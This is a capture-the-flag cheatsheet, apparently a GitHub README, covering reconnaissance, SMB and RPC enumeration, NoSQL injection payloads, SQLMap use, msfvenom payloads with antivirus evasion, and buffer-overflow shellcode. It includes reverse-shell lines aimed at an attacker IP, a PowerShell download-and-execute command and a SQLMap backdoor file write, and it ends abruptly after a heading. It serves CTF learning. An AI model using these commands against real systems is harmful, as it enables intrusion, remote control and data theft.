# Awesome Capture the Flag Cheatsheet [![Awesome](https://awesome.re/badge-flat.svg)](https://awesome.re)[<img src="media/icons8-hacking.svg" align="right" width="150">](https://uppusaikiran.github.io/hacking/Capture-the-Flag-CheatSheet/)


> A currated list of all capture the flag tips and strategies to solve Online CTF challenges and Hackthebox Machines.



---

## Contents

<!-- TOC start (generated with https://github.com/derlin/bitdowntoc) -->

- [System Hacking ](#system-hacking)
- [Web Hacking](#web-hacking)
- [File Hacking](#file-hacking)
- [Cryptography](#cryptography)
- [Forensics](#forensics)
- [Password Cracking](#password-cracking)
- [Privilige Escalation](#privilige-escalation)

<!-- TOC end -->

## System Hacking 

### Nmap Scanning


To discover hosts, services, and vulnerabilities efficiently in CTF environments, Nmap is a critical tool. Below are curated commands and strategies:

---

#### 🔍 Discover Live Hosts in a Subnet:
```bash
nmap -sn 10.10.0.0/24
```
Use this to quickly find which machines are up.

#### 🔧 Service and Version Detection:
```bash
nmap -sV <HOST_IP>
```
Identify open ports and the version of services running.

#### 🚨 Vulnerability Scanning:
```bash
nmap --script vuln <HOST_IP>
```
Uses default vulnerability detection scripts against known services.

#### 🔍 Aggressive Full Port + OS Detection + Script Scanning:
```bash
nmap -sS -T4 -A -p- <HOST_IP>
```
Scans all 65535 TCP ports with OS, version detection, script scanning and traceroute.

#### 🔐 SSL/TLS Enumeration:
```bash
nmap --script ssl-enum-ciphers -p 443 <HOST_IP>
```
Displays supported SSL/TLS ciphers for HTTPS services.

---

### 🎯 Pro Tips for CTFs:

- **Scan Specific Ports Quickly:**
```bash
nmap -sS -p 21,22,80,443 <HOST_IP>
```
Focus on commonly used service ports.

- **Use Top Ports Only (Fast Scan):**
```bash
nmap --top-ports 100 -T4 <HOST_IP>
```
Scans the 100 most common ports.

- **UDP Scanning:**
```bash
nmap -sU -T4 -F <HOST_IP>
```
Useful for services like DNS (53), SNMP (161).

- **Brute Force Login Scripts (use responsibly):**
```bash
nmap --script ftp-brute -p 21 <HOST_IP>
```
Try brute force login on exposed FTP.

- **Find HTTP Hidden Paths or Directories:**
```bash
nmap --script http-enum -p 80 <HOST_IP>
```
List web directories.

- **Detect SMB Shares:**
```bash
nmap --script smb-enum-shares -p 445 <HOST_IP>
```
Helpful for lateral movement or sensitive info.

- **Aggressive Script Scan for All Services:**
```bash
nmap -sC -sV <HOST_IP>
```
Runs a set of default scripts for information gathering.

- **Scan Output to File (For Notes):**
```bash
nmap -sV -oN scan.txt <HOST_IP>
```
Useful for documentation or later review.

---

Leverage Nmap's script database (`ls /usr/share/nmap/scripts/`) to explore more targeted scripts based on your CTF scenario.

Stay stealthy when required, and always adapt your scanning strategy to the time constraints and rules of the challenge.


### Netdiscover Scanning

To passively discover machines on the network, use **Netdiscover**. It listens for ARP requests to identify live hosts without sending packets, making it ideal for stealth reconnaissance in CTFs or red team exercises.

```bash
netdiscover -i <INTERFACE>
```

If unsure of your interface, identify it using:
```bash
ip a
# or
ifconfig
```

**Sample Output:**
```
Currently scanning: 192.168.17.0/16   |   Screen View: Unique Hosts
3 Captured ARP Req/Rep packets, from 8 hosts.   Total size: 480
_____________________________________________________________________________
 IP              At MAC Address       Count     Len  MAC Vendor / Hostname      
-----------------------------------------------------------------------------
192.168.1.1      11:22:33:44:55:66         1      60  NETGEAR                                                       
192.168.1.2      21:22:33:44:55:66         1      60  Apple, Inc.                                                   
192.168.1.8      41:22:33:44:55:66         1      60  Intel Corporate 
```

---

### 🎯 Pro Tips for CTFs Using Netdiscover:

- **Use with `-r` flag to scan specific subnet range:**
```bash
netdiscover -r 10.10.0.0/24
```
Faster than default mode for known ranges (e.g., in HackTheBox or TryHackMe labs).

- **Combine with Wireshark or tcpdump:**
Use `netdiscover` to find active hosts and then monitor them with packet sniffers.

- **Scan for MAC vendor anomalies:**
Identify devices with spoofed MACs (e.g., "Private" or "Unknown") which might be attacker-controlled.

- **Run in background during a CTF session:**
Keep `netdiscover` running in a separate terminal to monitor new devices that join the network.

- **Use in stealth mode:**
Unlike Nmap, this does not actively probe. Good for avoiding detection in blue team CTF scenarios.

---

**Important:** Netdiscover works only on local networks. It cannot discover hosts outside of your subnet.

For maximum effectiveness, always complement passive scanning with active tools (like Nmap) once initial targets are discovered.

---

### Nikto Scanning

To scan for web vulnerabilities using **Nikto**, a powerful web server scanner that tests for thousands of known issues.

```bash
nikto -h <HOST_IP>
```

This tool is effective for identifying outdated software, insecure configurations, and common CVEs.

---

### 🎯 Pro Tips for CTFs Using Nikto:

- **Scan HTTPS hosts with SSL support:**
```bash
nikto -h https://<HOST_IP>
```
Detects SSL-specific vulnerabilities.

- **Save output to a file for review or reporting:**
```bash
nikto -h <HOST_IP> -output nikto_scan.txt
```
Useful for documentation or post-exploitation analysis.

- **Scan specific ports (e.g., 8080, 8443):**
```bash
nikto -h <HOST_IP> -p 8080
```
Often CTFs run web servers on non-standard ports.

- **Use with web proxies (e.g., Burp Suite):**
```bash
nikto -h <HOST_IP> -useproxy http://127.0.0.1:8080
```
Intercept and analyze requests manually.

- **Combine with other tools:**
Use Nikto findings to feed into further attacks with tools like `gobuster`, `wpscan`, or custom scripts.

---

**Note:** Nikto is noisy and easily detectable. Avoid using in stealth/red team scenarios unless allowed.


### Web Server Enumeration

When ports **80 (HTTP)** or **443 (HTTPS)** are open, it likely indicates a web service. This presents an opportunity to enumerate for flags, directories, and version-specific vulnerabilities.

---

### 🔍 Basic Web Checks

- **Check for hidden paths (robots.txt):**
```bash
curl http://<HOST_IP>/robots.txt
```
Common in CTFs for holding easter eggs or clues.

- **Identify the Web Server and Version:**
```bash
curl -I <HOST_IP>
```
**Sample Output:**
```
HTTP/1.1 200 OK
Date: Mon, 11 May 2020 05:18:21
Server: gws
Last-Modified: Mon, 11 May 2020 05:18:21
Content-Length: 4171
Content-Type: text/html
Connection: Closed
```
Look at the `Server:` header to find out if it’s Apache, Nginx, or a specific vendor.

---

### 🛡️ If Port 80 is Closed But Expected to Be Open

This may indicate:
- Presence of **Intrusion Detection System (IDS)**
- **Port knocking** mechanism in place

#### Workarounds:
- **Rescan with a delay:**
```bash
sleep 10 && nmap -p 80 <HOST_IP>
```
Sometimes port availability changes after time or after other ports are probed.

- **Use TCP connect scan to bypass SYN scan restrictions:**
```bash
nmap -p 80 -sT <HOST_IP>
```
Example output:
```
PORT     STATE  SERVICE
80/tcp   closed http
```
SYN scans (`-sS`) may be blocked or filtered by the firewall, while `-sT` (full TCP handshake) can bypass it in some setups.

---

### 🎯 Pro Tips for CTFs:

- **Use tools like `whatweb` or `wappalyzer`** to detect CMS or frameworks.
```bash
whatweb <HOST_IP>
```

- **Combine with `gobuster` or `dirsearch`** for brute-forcing directories:
```bash
gobuster dir -u http://<HOST_IP> -w /usr/share/wordlists/dirb/common.txt
```

- **Always check for default creds if CMS is identified** (e.g., `admin:admin`, `guest:guest`).

- **Use Burp Suite or ZAP for deeper inspection** when a login portal or forms are found.

- **Try alternative ports like 8080, 8000, or 8443** if no web app is found on 80/443.

---

Web services often hold CTF flags in directories, source code comments, or misconfigurations. Always inspect thoroughly!


---

### 📂 Directory Bursting

To enumerate hidden directories and files on a web server, directory brute-forcing is essential in CTFs.

#### Using `wfuzz`:
```bash
wfuzz -u http://<HOST_IP>/FUZZ/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

#### Using `gobuster` (faster alternative):
```bash
gobuster dir -u http://<HOST_IP>/ -w /usr/share/wordlists/dirb/common.txt -t 50
```

#### Using `dirsearch` (Python-based tool):
```bash
python3 dirsearch.py -u http://<HOST_IP>/ -e php,html,txt -x 403,404
```

---

### 🎯 Pro Tips for CTFs:

- **Try multiple extensions**: CTF flags are often hidden as `.php`, `.txt`, `.bak`, etc.
```bash
-gobuster -x php,txt,bak
```

- **Use recursive mode** in tools like `dirsearch` to go deep into discovered folders.

- **Filter out 403/404 responses** to reduce noise and focus on valid paths.

- **Look for backup files or config leaks** like `.git/`, `config.php`, `.env`.

- **Scan for hidden parameters** using `wfuzz`:
```bash
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://<HOST_IP>/index.php?FUZZ=test
```

- **Check robots.txt and sitemap.xml** for hints to hidden pages.



---

### 🧠 Generating Wordlist from the Website

Use `cewl` to crawl a target website and generate a custom wordlist based on its content—useful for password attacks, username discovery, or directory bruteforcing.

#### Basic Usage:
```bash
cewl -w wordlist.txt -d 10 -m 1 http://<SERVER_IP>/
```

#### Word Count:
```bash
wc wordlist.txt
# 354  354 2459 wordlist.txt
```

---

### 🎯 Pro Tips for CTFs:

- **Increase depth (`-d`)** to extract words from deeper pages (e.g., `/about`, `/team`, `/login`).
- **Use `-e`** to include email addresses in output:
```bash
cewl -e -w emails.txt http://<HOST_IP>/
```
- **Use in combo with Hydra or Burp** for login brute-force attacks.
- **Run with a custom user-agent (`-a`)** to bypass basic WAFs:
```bash
cewl -a "Mozilla/5.0" -w wordlist.txt http://<HOST_IP>/
```
- **Use `--with-numbers`** if the site includes numbers in words (e.g., `admin123`).


---

### 📁 SMB is Open

When ports **139/445** are open, the target may be running **SMB (Server Message Block)**—commonly misconfigured in CTFs, making it a goldmine for enumeration and exploitation.

---

#### 🔍 Anonymous Share Enumeration
```bash
smbclient -L \\\\<HOST_IP>
```
Lists available shares. If successful without credentials, the server allows anonymous login.

---

#### 📂 Mounting SMB Share (Anonymous or Authenticated)
```bash
mkdir /mnt/smb
mount -t cifs //<HOST_IP>/<SHARE> /mnt/smb/ -o guest
```
Or use credentials:
```bash
mount -t cifs //<HOST_IP>/<SHARE> /mnt/smb/ -o username=<user>,password=<pass>
```

---

#### 🔐 With Credentials – Using `smbmap`
```bash
smbmap -H <HOST_IP> -u administrator -p password
```
Enumerates shares, permissions, and access level.

---

#### 🚀 Gaining Shell – Using `psexec.py`
```bash
python3 /opt/impacket/examples/psexec.py administrator@<HOST_IP>
```
If credentials are valid and ADMIN$ is accessible, this will drop you into a SYSTEM shell.

---

### 🎯 Pro Tips for CTFs:

- **Use `enum4linux`** for a quick, detailed SMB sweep:
```bash
enum4linux -a <HOST_IP>
```

- **Look for backup files or password.txt in shares** like `Backups`, `Users`, or `C$`.

- **Use `smbclient` interactively** to explore shares:
```bash
smbclient \\\\<HOST_IP>\\Backups
smb: \> ls
```

- **Try null sessions (`-N`)**:
```bash
smbclient -L //<HOST_IP> -N
```

- **If `psexec.py` fails**, try `wmiexec.py`, `smbexec.py`, or `atexec.py` (from Impacket).

- **Automate with tools like `crackmapexec`** for wide-scale credential spraying:
```bash
crackmapexec smb <HOST_IP> -u users.txt -p passwords.txt
```

---

### 💾 To Extract and Mount VHD Drive Files

Virtual Hard Disk (VHD) files are often found in forensic or Windows-based CTF challenges. These can contain hidden flags, user profiles, or sensitive files.

---

#### 📦 List Contents of the VHD
```bash
7z l <FILENAME>.vhd
```
Quickly inspects the archive to confirm structure before mounting.

---

#### 🔗 Mount VHD with Guestmount
```bash
guestmount --add <FILENAME>.vhd --inspector -ro -v /mnt/vhd
```
- `--inspector`: Auto-detects and mounts the correct partition.
- `-ro`: Mounts as **read-only** (safe for analysis).
- `-v`: Enables verbose output.

Make sure `libguestfs-tools` is installed.

---

### 🎯 Pro Tips for CTFs:

- **Always check for `.flag`, `.txt`, or `.zip` inside `Desktop`, `Downloads`, `Documents`.**
- **Search for browser histories or credentials** in:
  - `AppData/Roaming`
  - `Users/<name>/Recent`
- **If guestmount fails**, try manual partition detection:
```bash
fdisk -l <FILENAME>.vhd
```
Then mount using loop device:
```bash
mount -o ro,loop,offset=<OFFSET> <FILENAME>.vhd /mnt/vhd
```
- **Use `strings` or `binwalk`** to extract clues from within the VHD file:
```bash
strings <FILENAME>.vhd | grep flag
```

---

### 🔍 To Search for Exploits on Metasploit by Name

Use `searchsploit` to quickly find known exploits or vulnerabilities from the Exploit-DB repository.

#### Basic Usage:
```bash
searchsploit apache 1.2.4
```
Searches for Apache version-specific exploits in the local database.

---

### 🎯 Pro Tips for CTFs:

- **Use `-x` to open the exploit directly:**
```bash
searchsploit -x exploits/unix/remote/12345.txt
```

- **Mirror the database to ensure it’s up to date:**
```bash
searchsploit -u
```

- **Use quotes for precise matching:**
```bash
searchsploit "Apache 2.4.49"
```

- **Search inside PoCs for keywords (e.g., RCE, LFI):**
```bash
searchsploit --www | grep RCE
```

- **Search using CVE-ID if known:**
```bash
searchsploit CVE-2021-41773
```

- **For Metasploit directly:**
```bash
msfconsole
> search type:exploit name:apache
```

---

### 📰 WordPress Open

If `/wp-login.php` is discovered during web enumeration, the target is likely running WordPress—a common and often vulnerable CMS in CTFs.

---

#### 🔑 Brute Force Login with Hydra
```bash
hydra -V -l admin -P wordlist.dic <HOST_IP> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
```
- Adjust `F=` string based on response for failed login.
- Capture login POST parameters using **Burp Suite**.

---

#### 🔎 Scan for Plugins, Themes, and Vulnerabilities with WPScan
```bash
gem install wpscan
wpscan --url http://<HOST_IP> --enumerate u,vt,tt,cb,dbe --plugins-detection aggressive
```
- Use with credentials:
```bash
wpscan --url http://<HOST_IP> --usernames admin --passwords wordlist.dic
```

---

#### 🐚 Reverse Shell via Admin Upload (Metasploit)
```bash
msfconsole
use exploit/unix/webapp/wp_admin_shell_upload
set RHOST <HOST_IP>
set USERNAME admin
set PASSWORD <password>
run
```

---

### 🎯 Pro Tips for CTFs:

- **Check `/readme.html` or `wp-includes/version.php`** for WordPress version leakage.
- **Always enumerate users first** to reduce brute force attempts:
```bash
wpscan --url http://<HOST_IP> --enumerate u
```
- **Scan for outdated plugins/themes**—they’re frequent attack vectors.
- **Look for writable upload directories or `eval()` usage** in plugin files.
- **Try LFI/SQLi on lesser-known plugins** if source code or version is known.

---

### 🛰️ RPC Open

If port **135** (or **445** with RPC over SMB) is open, it indicates a Windows host with Remote Procedure Call (RPC) capabilities. Misconfigured RPC access can expose usernames, shares, and domain info.

---

#### 🔐 Anonymous RPC Login
```bash
rpcclient -U "" <HOST_IP>
```
Press **Enter** when prompted for a password to attempt a null session.

---

### 🎯 Pro Tips for CTFs:

- **Enumerate users:**
```bash
rpcclient <HOST_IP> -U "" -c "enumdomusers"
```

- **Get detailed user info:**
```bash
rpcclient <HOST_IP> -U "" -c "queryuser RID"
```

- **Enumerate groups:**
```bash
rpcclient <HOST_IP> -U "" -c "enumdomgroups"
```

- **Find policies or domain info:**
```bash
rpcclient <HOST_IP> -U "" -c "getdompwinfo"
```

- **Chain with `smbclient`** to access user directories based on enum results.

- **Use RID cycling to brute-force usernames:**
```bash
rpcclient <HOST_IP> -U "" -c "lookupsids S-1-5-21-XXXX-XXXX-XXXX-500"
```

- **If credentials are found**, use them with `rpcclient -U user%pass <HOST>` for full access.

---

### 💻 PowerShell

PowerShell is a powerful post-exploitation and enumeration tool on Windows machines.

---

#### 🚫 Bypass Execution Policy
```bash
powershell.exe -exec bypass
```
Allows execution of unsigned scripts without modifying system-wide policy.

---

### 🎯 Pro Tips for CTFs:

- **Download and execute payloads:**
```powershell
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://<IP>/rev.ps1')"
```

- **Run encoded commands to evade detection:**
```bash
powershell -EncodedCommand <Base64Payload>
```

- **Use PowerView or Nishang** for enumeration, privilege escalation, and persistence.

- **Use `-w hidden` to suppress PowerShell window (post-exploit):**
```bash
powershell -w hidden -exec bypass -File script.ps1
```

- **Enumerate system info, users, and network:**
```powershell
Get-LocalUser
Get-LocalGroupMember administrators
Get-NetIPAddress
```

---

### 🧬 NoSQL Injection – Full CTF Exploitation Guide

---

#### 🔓 Login Bypass Payloads

These exploit MongoDB’s flexible querying:
```bash
username[$ne]=null&password[$ne]=null
username[$gt]=admin&password[$gt]=admin
username[$regex]=.*&password[$regex]=.*
username[$in][]=admin&password[$in][]=admin
```

These payloads allow login by returning `true` on any non-null or regex match.

---

### 🛠️ Common Injection Entry Points

| Injection Vector        | Description                         |
|-------------------------|-------------------------------------|
| URL parameters          | `?username[$ne]=1&password[$ne]=1` |
| Form fields (POST)      | login inputs                        |
| JSON body (APIs)        | `{"username": {"$ne": null}}`      |
| HTTP headers            | `X-User: {"$gt": ""}`               |

---

### 🧪 Blind NoSQL Injection (User Enumeration)

Try brute-forcing usernames one letter at a time:
```bash
username[$regex]=^a&password[$ne]=x
username[$regex]=^adm&password[$ne]=x
```
Check for response differences to confirm partial matches.

---

#### 🔍 Extract Usernames via Regex

This helps discover valid users:
```bash
username[$regex]=^admin&password[$ne]=anything
```

---

### 🧠 Extract Password Length (with `$where`)

If `$where` is supported (JS injection):
```bash
username=admin&password[$where]=this.password.length==6
```
Enumerate the length first, then extract char-by-char.

---

### 🔁 Time-Based Injection (Timing Attacks)

If errors don’t help, exploit time:
```bash
username=admin&password[$where]=sleep(5000)
```
Or for some frameworks:
```bash
username=admin&password[$where]=function() { sleep(5000); return true; }
```
If delay occurs, injection is successful.

---

### 🧰 Automated Tools

#### 🛠️ NoSQLMap
```bash
git clone https://github.com/codingo/NoSQLMap
cd NoSQLMap
python3 nosqlmap.py
```

Use for:
- Dumping DBs
- Enumerating users
- Authentication bypass
- JS injection exploitation

#### 🐍 Burp Suite + Intruder

1. Intercept login POST request.
2. Send to Intruder.
3. Fuzz with:
   - `[$ne]=1`
   - `[$regex]=^a`
   - `[$where]=...`

Monitor responses for variations.

---

### 🔐 Privilege Escalation / Admin Hijack

If user exists:
```bash
username=admin&password[$ne]=invalid
```
If login succeeds, you’ve confirmed user `admin` exists.

To bypass:
```bash
username=admin&password[$gt]=
```

If admin panel access is via role:
```bash
role[$eq]=admin
```

---

### 🧨 Escaping Filters

Bypass weak sanitization:
- Use array parameters: `username[$in][]`
- Encode special characters: `%24ne`, `%24regex`
- JSON nested injection: 
```json
{"user":{"$gt":""}}
```

---

### 🎯 Final CTF Tips:

- **Check login, search, filter, and API endpoints**—anywhere user input reaches MongoDB.
- **Explore headers (`X-User`, `X-Auth`)** for NoSQL injection in hidden APIs.
- **Always enumerate usernames before attempting bruteforce**.
- **Look for JavaScript-enabled backends to exploit `$where`**.
- **Chain NoSQLi with LFI, RCE, or misconfigured MongoDB access**.

---


## Web Hacking

### Five Stages of Web Hacking

```
    * Reconnaissance
    * Scanning and Enumeration
    * Gaining Access
    * Maintaining Access
    * Covering Tracks
```

---

### 🛰️ Enumeration and Reconnaissance Tools

Recon is critical in CTFs. Use these tools to gather intelligence before exploiting.

---

#### 🔎 Passive Reconnaissance

- **Whois, Nslookup, Dig, Dnsrecon** – Basic DNS and domain info.
- **Google Dorking (Google Fu)** – Discover exposed files or directories:
  - `site:<target.com> ext:log`
  - `intitle:index.of "backup"`

---

#### 🌐 Subdomain & Certificate Enumeration

- [**Sublist3r**](https://github.com/aboul3la/Sublist3r) – Fast subdomain discovery:
  ```bash
  sublist3r -d target.com
  ```
- [**crt.sh**](https://crt.sh) – Public SSL certificate transparency logs.
- [**Amass**](https://github.com/owasp-amass/amass) – Extensive subdomain and DNS enumeration.

---

#### 📧 Email & Breach Lookup

- [**Hunter.io**](https://hunter.io) – Discover associated emails.
- [**HaveIBeenPwned**](https://haveibeenpwned.com/) – Check email breach exposure.
- [Clear Text Password Dataset](https://github.com/philipperemy/tensorflow-1.4-billion-password-analysis) – Build realistic password lists.

---

#### 🧠 Fingerprinting and Tech Stack

- **Wappalyzer**, **WhatWeb**, **BuiltWith** – Identify backend tech, CMS, or frameworks.
- **Nmap** – Version detection and port scanning.
- **Netcat** – Basic banner grabbing or listener setup.

---

#### 🔐 Headers, Files, and Hidden Paths

- [**SecurityHeaders**](https://securityheaders.com/) – Scan HTTP headers for misconfigurations.
- **OWASP ZAP Proxy** – Crawl and extract hidden files or admin paths.
- **Burp Suite** – Spider, Repeater, Intruder for thorough recon.

---

#### 🕵️‍♀️ Information Harvesting from Search Engines

```bash
theharvester -d microsoft.com -l 200 -g -b google
```
- Use `-b all` for multiengine scraping.
- Target emails, domains, subdomains, hosts, employee names.

---

### 🎯 Pro Tips for CTFs:

- Always run recon in **parallel threads** (subdomains, certs, emails, etc.).
- Use findings to create a **custom wordlist** for bruteforce (e.g., via `cewl`, `crunch`).
- Pivot findings into active attacks — open ports, login panels, emails, and misconfigs often lead to the first foothold.


### Scanning

Ping Sweep a network.

```
> $ nmap -sn <NETWORK>
```

SYN Scan with Speed of 4 and port of common 1000 TCP.

```
> $ nmap -T4 <NETWORK>
```

All Port scan with All Scanning including OS, Version, Script and Traceroute.

```
> $ nmap -T4 -A -p- <NETWORK>
```

To scan for UDP Ports (Dont scan all scans, as it takes lot of time).


```
> $ nmap -sU -T4 <NETWORK>
```

---

### 💣 Payloads

Payloads are code executed on the target after exploitation. In Metasploit, they’re categorized as **Staged** and **Non-Staged**.

---

#### 🧱 Non-Staged Payload (Single Payload)
```bash
windows/meterpreter_reverse_tcp
```
- Sends the **entire payload at once**.
- Easier to detect but **simpler** to use.
- More reliable in **unstable networks**.

---

#### 🧩 Staged Payload (Modular/Two-Step)
```bash
windows/meterpreter/reverse_tcp
```
- Sends a **small stager first**, then downloads the full payload.
- Smaller footprint during delivery, useful for **evading filters**.
- **More stealthy**, but may break in flaky connections.

---

### 🎯 Pro Tips for CTFs:

- Use **`msfvenom`** to generate standalone payloads:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > shell.exe
```

- For web shell upload:
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f raw > shell.php
```

- Use **`multi/handler`** in Metasploit to catch the shell:
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444
run
```

- Encode payloads to evade AV:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -e x86/shikata_ga_nai -f exe > shell.exe
```

---

### 🐚 Shells

Shells are essential for post-exploitation access. They can be **Bind Shells** or **Reverse Shells**, depending on which side initiates the connection.

---

#### 🔗 Bind Shell

Target listens, and attacker connects **in**.

1️⃣ **On Target (create shell):**
```bash
nc -lvp <PORT> -e /bin/bash
```

2️⃣ **On Attacker (connect to shell):**
```bash
nc <TARGET_IP> <PORT>
```

---

#### 🔁 Reverse Shell

Attacker listens, and target connects **back**.

1️⃣ **On Attacker (listen):**
```bash
nc -lvp 9001
```

2️⃣ **On Target (trigger shell):**
```bash
bash -c 'bash -i &> /dev/tcp/<ATTACKER_IP>/9001 0>&1'
```

---

#### 🧪 Perl Reverse Shell (Common in CTFs)
```bash
perl -MIO -e '$p=fork;exit if $p;...'
```
- Use it when you gain command execution via web.
- Swap in your IP and port.
- Stable but easily detectable—upgrade shell after.

---

### 🧼 Shell Upgrade Tips

If you get a basic shell, upgrade it:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

And make it interactive:
```bash
CTRL+Z
stty raw -echo; fg
reset
export TERM=xterm
```

---

### 🎯 Pro Tips for CTFs:

- **Always try multiple shell methods:** Bash, Python, Perl, PHP, Socat.
- **Use `rlwrap` or `script` to wrap Netcat** for history/navigation.
- **Some machines block Netcat**—use `socat` or `mkfifo` shell:
```bash
mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc <ATTACKER_IP> <PORT> > /tmp/f
```

- **Check cron jobs or file uploads for persistence** using reverse shells.


---

### 💥 Buffer Overflow

Buffer overflow exploits can be used to execute arbitrary code, often giving shell access. One key step is injecting shellcode into the program's memory.

---

#### 🛠️ Generate Shellcode with `pwntools` (Python)

Quick shellcode to spawn `/bin/sh`:
```bash
python -c "import pwn; print(pwn.asm(pwn.shellcraft.linux.sh()))"
```

---

#### 🔁 Pipe Shellcode into Vulnerable Binary
```bash
(python -c "import pwn; print(pwn.asm(pwn.shellcraft.linux.sh()))"; cat) | ./vuln
```

- Combines shellcode and standard input to exploit buffer in real time.
- `cat` keeps the session alive after payload injection.

---

### 🎯 Pro Tips for CTFs:

- **Set architecture** for shellcode:
```python
context.arch = 'amd64'  # or 'i386'
```

- **Debug with GDB:**
```bash
gdb ./vuln
```

- **Use pattern generation to find offset:**
```bash
pwn cyclic 100
pwn cyclic -l <crash_value>
```

- **Attach `pwntools` debugger**:
```python
p = gdb.debug("./vuln", gdbscript="b *main\ncontinue")
```

- **Use `ROPgadget` to find useful instructions** for ret2libc or ROP chaining.

---

### 🚪 Gobuster – Directory & File Enumeration

Gobuster is a fast, flexible tool used to brute-force directories, files, and virtual hosts on web servers—critical for discovering hidden content during CTFs.

---

#### 🔍 Basic Directory Enumeration
```bash
gobuster dir -u http://<IP_ADDRESS> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
- Use default extensions or combine with `-x php,txt,bak` for better results.

---

#### 🍪 With Cookies (Authenticated Enumeration)
```bash
gobuster dir -u http://<IP_ADDRESS> \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-x php -c PHPSESSID=<COOKIE_VALUE>
```
- Useful when login is required or access is session-based.

---

### 🎯 Pro Tips for CTFs:

- **Target file extensions**:
```bash
-x php,html,txt,bak,zip
```

- **Change status code filters** to include redirects, forbidden, etc.:
```bash
--status-codes 200,204,301,302,307,401,403
```

- **Recursive brute-force** (manually explore found directories).
- **Use smaller wordlists for initial scan**, then refine:
  - `/usr/share/wordlists/dirb/common.txt`
  - `/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt`

- **Add user-agent to evade simple WAFs:**
```bash
--user-agent "Mozilla/5.0"
```

- **Scan HTTPS URLs** with `-k` to ignore SSL validation (CTFs often use self-signed certs):
```bash
gobuster dir -k -u https://<IP_ADDRESS> -w ...
```

- **Don't miss hidden admin or upload portals** like:
  - `/admin`, `/upload`, `/debug`, `/backup`


---

### 🧬 SQLMap – SQL Injection Automation

SQLMap automates the detection and exploitation of SQL injection flaws. In CTFs, it’s a fast way to extract databases, users, tables, and even get shells.

---

#### 🔁 Capturing HTTP Request via Burp Suite

1. Intercept a vulnerable POST request:
```
POST / HTTP/1.1
Host: <IP_ADDRESS>
...
search=help
```

2. **Right-click → Save to File** (e.g., `search.req`)

---

#### 🚀 Running SQLMap on the Captured Request

```bash
sqlmap -r search.req --batch --force-ssl
```
- `-r`: Use raw HTTP request file.
- `--batch`: Run without interactive prompts.
- `--force-ssl`: Useful for HTTPS endpoints.

---

### 🎯 Pro Tips for CTFs:

- **Extract full DB structure:**
```bash
sqlmap -r search.req --dbs
sqlmap -r search.req -D <db_name> --tables
sqlmap -r search.req -D <db_name> -T <table_name> --dump
```

- **Enumerate current DB, user, and version:**
```bash
sqlmap -r search.req --current-db
sqlmap -r search.req --current-user
sqlmap -r search.req --banner
```

- **OS Shell or File Write:**
```bash
sqlmap -r search.req --os-shell
sqlmap -r search.req --file-write=backdoor.php --file-dest=/var/www/html/backdoor.php
```

- **Test specific parameter (if request has multiple):**
```bash
sqlmap -r search.req -p search
```

- **Bypass WAFs:**
```bash
--tamper=space2comment,randomcase
```

- **Use cookies (if session required):**
```bash
sqlmap -r search.req --cookie="PHPSESSID=<COOKIE>"
```

- **Avoid IDS detection:**
```bash
--random-agent --delay=1 --threads=1
```

---


## File Hacking

---

### 📄 Extract Hidden Text from PDF Files

PDFs in CTFs often hide flags using layers, compression, white text, or embedded objects.

---

#### 🖱️ Manual Extraction (Quick Try)

1. **Open PDF → Ctrl + A → Ctrl + C**
2. **Paste into Notepad** or any plain text editor.

> ✅ Works if text is layered or colored white.

---

#### 🎨 Use Inkscape (For Embedded/Layered Flags)

1. Open PDF in [**Inkscape**](https://inkscape.org)
2. Repeatedly click **"Ungroup"** (`Shift + Ctrl + G`)
3. Look for:
   - White-on-white text
   - Hidden objects or overlays
   - Off-canvas data

> Great for **vector-based or image-embedded flags**.

---

#### 🔧 Decompress PDF with `qpdf`

```bash
qpdf --qdf --object-streams=disable input.pdf output_uncompressed.pdf
```

- Converts PDF streams into readable text.
- Open with a text editor and search for `flag`, `HTB`, `CTF{`, etc.

---

### 🎯 Pro Tips for CTFs:

- **Search hex editors** for embedded strings:
```bash
strings file.pdf | grep -i flag
```

- **Use `pdf-parser.py`** (by Didier Stevens) to inspect PDF objects:
```bash
pdf-parser.py input.pdf
```

- **Try `binwalk`** if the PDF is embedded with other files:
```bash
binwalk input.pdf
```

- **Look for invisible/hidden layers in GIMP or Photoshop** if it's image-heavy.

- **Use OCR (`tesseract`)** if text is embedded inside images:
```bash
tesseract image.png stdout
```


---

### 📦 Compressed File Extraction

In CTFs, compressed files may hide flags deeply nested or disguised using alternate extensions or embedded formats.

---

#### 🔍 Identify File Type (Magic Bytes)

Check the file header:
```bash
xxd <FILE_NAME> | head
```
- If it starts with `50 4B` (`PK`), it’s likely a **ZIP** file, even if the extension is misleading.

---

#### 🧨 Extract Recursively with `binwalk`

```bash
binwalk -Me <FILE_NAME>
```
- `-M`: Enables recursive extraction of embedded files.
- `-e`: Automatically extracts known file types.
- Saves output in `_FILE_NAME.extracted/`.

---

### 🎯 Pro Tips for CTFs:

- **Use `file` command to confirm type:**
```bash
file <FILE_NAME>
```

- **Manually unzip if standard ZIP:**
```bash
unzip <FILE_NAME>
```

- **Use `7z` for unknown or nested formats:**
```bash
7z x <FILE_NAME>
```

- **Inspect for password-protected archives inside:**
  - Use `fcrackzip` or `john` to brute-force:
```bash
fcrackzip -v -u -D -p wordlist.txt protected.zip
```

- **Sometimes `.jpg`, `.png`, or `.docx` hide zips internally. Use `binwalk` or `steghide` to detect.**

- **Loop unzipper for nested zips:**
```bash
while file *.zip | grep -q 'Zip archive'; do for f in *.zip; do unzip "$f" -d "${f}_unzipped"; done; cd *_unzipped; done
```


---

### 🧵 Extract Hidden Strings

CTF files often hide flags in binary, encoded, or obfuscated forms. Use basic Linux tools for deep inspection.

---

#### 🔍 View Embedded or Encoded Text

